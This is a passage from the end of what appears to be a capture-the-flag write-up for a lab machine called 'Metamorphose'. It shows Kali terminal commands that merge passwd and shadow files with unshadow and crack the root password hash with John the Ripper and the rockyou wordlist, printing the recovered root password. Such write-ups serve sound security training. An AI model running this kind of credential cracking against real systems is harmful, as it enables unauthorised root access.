root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:19779:0:99999:7:::

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ unshadow passwd shadow > crack                        

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ cat crack     
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:0:0:root:/root:/bin/bash

┌──(kali💀kali)-[~/temp/Metamorphose]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt crack --format=crypt
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qazwsxedc        (root)     
1g 0:00:00:11 DONE (2024-08-05 12:57) 0.08554g/s 172.4p/s 172.4c/s 172.4C/s amore..jesusfreak
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408060058529.png" alt="image-20240806005814286" style="zoom:50%;" />

## 参考

https://www.youtube.com/watch?v=hWFoDmhdaws

